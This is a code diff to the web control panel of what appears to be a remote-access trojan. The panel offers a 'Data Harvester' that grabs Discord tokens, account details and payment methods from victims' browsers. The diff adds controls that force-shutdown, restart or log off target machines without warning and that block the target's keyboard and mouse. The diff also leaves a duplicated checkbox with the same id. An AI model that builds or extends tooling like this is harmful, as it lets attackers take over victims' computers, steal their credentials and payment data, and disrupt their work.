@@ -291,6 +291,7 @@ select{background:#050810;border:1px solid var(--border);padding:4px 8px;color:v
       <button class="tab-btn" data-tab="privesc" style="color:var(--warn);">⚡ PRIVESC</button>
       <button class="tab-btn" data-tab="admin" style="color:var(--danger);">👑 ADMIN</button>
       <button class="tab-btn" data-tab="data" style="color:var(--purple);">💀 DATA</button>
+      <button class="tab-btn" data-tab="power" style="color:var(--danger);">⏻ POWER</button>
     </div>
     <div class="modal-body">
 
@@ -309,6 +310,9 @@ select{background:#050810;border:1px solid var(--border);padding:4px 8px;color:v
           <button class="btn btn-blue btn-sm" onclick="openUrl()">🌐 URL</button>
           <label style="display:flex;align-items:center;gap:5px;font-size:10px;color:var(--dim);cursor:pointer;">
             <input type="checkbox" id="remote-ctrl-toggle" onchange="toggleRemoteCtrl(this.checked)"> REMOTE CTRL
+          </label>
+          <label style="display:flex;align-items:center;gap:5px;font-size:10px;color:var(--warn);cursor:pointer;">
+            <input type="checkbox" id="disable-input-toggle" onchange="toggleDisableInput(this.checked)"> DISABLE KB+MOUSE
           </label>
           <label style="display:flex;align-items:center;gap:5px;font-size:10px;color:var(--danger);cursor:pointer;" title="Block all keyboard and mouse input on target">
             <input type="checkbox" id="disable-input-toggle" onchange="toggleDisableInput(this.checked)"> DISABLE KB+MOUSE
@@ -606,22 +610,69 @@ select{background:#050810;border:1px solid var(--border);padding:4px 8px;color:v
       <!-- DATA -->
       <div class="tab-content" id="tab-data">
         <div style="flex:1;min-height:0;overflow-y:auto;padding:20px 24px;">
-
           <div style="margin-bottom:18px;padding:14px;background:rgba(179,136,255,0.06);border:1px solid rgba(179,136,255,0.2);">
             <div style="font-size:10px;color:var(--purple);letter-spacing:2px;margin-bottom:6px;">💀 DATA HARVESTER</div>
             <div style="font-size:11px;color:var(--dim);line-height:1.8;">Extracts Discord tokens, account info, guilds, Nitro status, and payment methods from all browsers and Discord clients on the target. Results return directly to this panel.</div>
           </div>
-
           <div style="display:flex;gap:10px;margin-bottom:20px;flex-wrap:wrap;align-items:center;">
             <button class="btn btn-purple" onclick="runDiscordGrab()">💀 GRAB DISCORD TOKENS</button>
             <button class="btn btn-warn btn-sm" onclick="clearDiscordResults()">CLR</button>
             <span id="discord-grab-status" style="font-size:10px;color:var(--dim);"></span>
           </div>
-
           <div id="discord-results">
             <div style="font-size:11px;color:var(--dim);">No results yet — click GRAB to harvest tokens.</div>
           </div>
+        </div>
+      </div>
 
+      <!-- POWER -->
+      <div class="tab-content" id="tab-power">
+        <div style="flex:1;min-height:0;overflow-y:auto;padding:24px 28px;">
+          <div style="margin-bottom:22px;padding:14px 16px;background:rgba(255,51,102,0.06);border:1px solid rgba(255,51,102,0.2);">
+            <div style="font-size:10px;color:var(--danger);letter-spacing:2px;margin-bottom:5px;">⚠ POWER CONTROLS</div>
+            <div style="font-size:11px;color:var(--dim);line-height:1.8;">All shutdown and restart actions are <strong style="color:var(--warn);">forced</strong> — processes are killed immediately with no save prompts or dialogs.</div>
+          </div>
+          <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(210px,1fr));gap:14px;margin-bottom:28px;">
+            <div style="background:var(--panel2);border:1px solid rgba(255,51,102,0.35);padding:18px 16px;display:flex;flex-direction:column;gap:10px;">
+              <div style="font-size:9px;letter-spacing:3px;color:var(--danger);text-transform:uppercase;">Shutdown</div>
+              <div style="font-size:11px;color:var(--dim);line-height:1.6;">Force-kills all processes and powers off immediately. No dialogs.</div>
+              <button class="btn btn-red" onclick="powerAction('shutdown')">⏻ FORCE SHUTDOWN</button>
+            </div>
+            <div style="background:var(--panel2);border:1px solid rgba(255,107,53,0.35);padding:18px 16px;display:flex;flex-direction:column;gap:10px;">
+              <div style="font-size:9px;letter-spacing:3px;color:var(--warn);text-transform:uppercase;">Restart</div>
+              <div style="font-size:11px;color:var(--dim);line-height:1.6;">Force-kills all processes and reboots immediately. No dialogs.</div>
+              <button class="btn btn-warn" onclick="powerAction('restart')">↺ FORCE RESTART</button>
+            </div>
+            <div style="background:var(--panel2);border:1px solid rgba(0,180,255,0.3);padding:18px 16px;display:flex;flex-direction:column;gap:10px;">
+              <div style="font-size:9px;letter-spacing:3px;color:var(--accent2);text-transform:uppercase;">Sleep</div>
+              <div style="font-size:11px;color:var(--dim);line-height:1.6;">Suspends system to RAM. Session preserved on wake.</div>
+              <button class="btn btn-blue" onclick="powerAction('sleep')">💤 SLEEP</button>
+            </div>
+            <div style="background:var(--panel2);border:1px solid rgba(0,180,255,0.2);padding:18px 16px;display:flex;flex-direction:column;gap:10px;">
+              <div style="font-size:9px;letter-spacing:3px;color:var(--accent2);text-transform:uppercase;">Hibernate</div>
+              <div style="font-size:11px;color:var(--dim);line-height:1.6;">Writes session to disk, powers off. Restores on next boot.</div>
+              <button class="btn btn-blue" onclick="powerAction('hibernate')">🌙 HIBERNATE</button>
+            </div>
+            <div style="background:var(--panel2);border:1px solid rgba(0,255,136,0.2);padding:18px 16px;display:flex;flex-direction:column;gap:10px;">
+              <div style="font-size:9px;letter-spacing:3px;color:var(--accent);text-transform:uppercase;">Log Off</div>
+              <div style="font-size:11px;color:var(--dim);line-height:1.6;">Force signs out the current user session.</div>
+              <button class="btn btn-green" onclick="powerAction('logoff')">🚪 LOG OFF</button>
+            </div>
+            <div style="background:var(--panel2);border:1px solid rgba(179,136,255,0.3);padding:18px 16px;display:flex;flex-direction:column;gap:10px;">
+              <div style="font-size:9px;letter-spacing:3px;color:var(--purple);text-transform:uppercase;">Timed Shutdown</div>
+              <div style="font-size:11px;color:var(--dim);line-height:1.6;">Force shutdown after N seconds delay.</div>
+              <div style="display:flex;gap:6px;align-items:center;">
+                <input type="number" id="shutdown-delay" value="60" min="1" max="86400" style="width:70px;">
+                <span style="font-size:10px;color:var(--dim);">sec</span>
+              </div>
+              <div style="display:flex;gap:6px;">
+                <button class="btn btn-purple btn-sm" onclick="powerAction('shutdown_timed')">⏱ SET</button>
+                <button class="btn btn-warn btn-sm" onclick="powerAction('shutdown_cancel')">✕ CANCEL</button>
+              </div>
+            </div>
+          </div>
+          <div style="margin-bottom:8px;font-size:9px;letter-spacing:3px;color:var(--dim);text-transform:uppercase;border-bottom:1px solid var(--border);padding-bottom:4px;">Result</div>
+          <div id="power-result" style="font-size:12px;color:var(--dim);background:#050810;border:1px solid var(--border);padding:10px 14px;min-height:40px;white-space:pre-wrap;line-height:1.8;"></div>
         </div>
       </div>
 
@@ -1397,14 +1448,17 @@ async function runMassCmd(){
   </div>`).join('');
 }
 
-// ── Log ──
-function addLog(msg,type='info'){
-  const log=document.getElementById('log');
-  const line=document.createElement('div');
-  line.className='log-line';
-  line.innerHTML=`<span class="log-time">[${new Date().toTimeString().slice(0,8)}]</span><span class="log-msg ${type}">${esc(msg)}</span>`;
-  log.appendChild(line); log.scrollTop=log.scrollHeight;
-  while(log.children.length>80) log.removeChild(log.firstChild);
+
+// ── Disable KB+Mouse ──
+let inputDisabled = false;
+function toggleDisableInput(on){
+  if(!selectedClient){
+    document.getElementById('disable-input-toggle').checked = false;
+    return;
+  }
+  inputDisabled = on;
+  sendCmd(on ? 'input_disable' : 'input_enable');
+  addLog((on ? 'Disabled' : 'Enabled') + ' keyboard & mouse on ' + selectedClient.hostname, 'info');
 }
 
 // ── Discord Grab ──
@@ -1455,17 +1509,49 @@ async function runDiscordGrab(){
       ${a.admin_guilds && a.admin_guilds.length ? `
       <div style="margin-top:10px;">
         <div style="font-size:9px;letter-spacing:2px;color:var(--dim);margin-bottom:5px;text-transform:uppercase;">Admin/Owner Guilds</div>
-        ${a.admin_guilds.map(g=>`<div style="font-size:10px;color:var(--text);padding:3px 0;border-bottom:1px solid rgba(26,35,50,0.4);">${esc(g.name)} <span style="color:var(--dim);">(${g.members} members${g.vanity?` · .gg/${g.vanity}`:''})</span></div>`).join('')}
+        ${a.admin_guilds.map(g=>`<div style="font-size:10px;color:var(--text);padding:3px 0;border-bottom:1px solid rgba(26,35,50,0.4);">${esc(g.name)} <span style="color:var(--dim);">(${g.members} members${g.vanity?' · .gg/'+g.vanity:''})</span></div>`).join('')}
       </div>` : ''}
     </div>`;
   }).join('');
 }
-
 function clearDiscordResults(){
   document.getElementById('discord-results').innerHTML = '<div style="font-size:11px;color:var(--dim);">No results yet — click GRAB to harvest tokens.</div>';
   document.getElementById('discord-grab-status').textContent = '';
 }
 
+// ── Power Controls ──
+async function powerAction(action){
+  if(!selectedClient) return;
+  const resultEl = document.getElementById('power-result');
+  const labels = {
+    shutdown:        'Force shutting down...',
+    restart:         'Force restarting...',
+    sleep:           'Sending to sleep...',
+    hibernate:       'Hibernating...',
+    logoff:          'Logging off...',
+    shutdown_timed:  'Scheduling timed shutdown...',
+    shutdown_cancel: 'Cancelling timed shutdown...',
+  };
+  resultEl.style.color = 'var(--dim)';
+  resultEl.textContent = labels[action] || 'Sending command...';
+  const extra = {};
+  if(action === 'shutdown_timed'){
+    extra.delay = parseInt(document.getElementById('shutdown-delay').value) || 60;
+  }
+  const res = await sendCmdRaw('power_' + action, extra);
+  resultEl.style.color = res.status === 'ok' ? 'var(--accent)' : 'var(--danger)';
+  resultEl.textContent = res.msg || (res.status === 'ok' ? 'Done' : 'Error');
+}
+
+// ── Log ──
+function addLog(msg,type='info'){
+  const log=document.getElementById('log');
+  const line=document.createElement('div');
+  line.className='log-line';
+  line.innerHTML=`<span class="log-time">[${new Date().toTimeString().slice(0,8)}]</span><span class="log-msg ${type}">${esc(msg)}</span>`;
+  log.appendChild(line); log.scrollTop=log.scrollHeight;
+  while(log.children.length>80) log.removeChild(log.firstChild);
+}
 
 // ── Utils ──
 function esc(s){ return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }
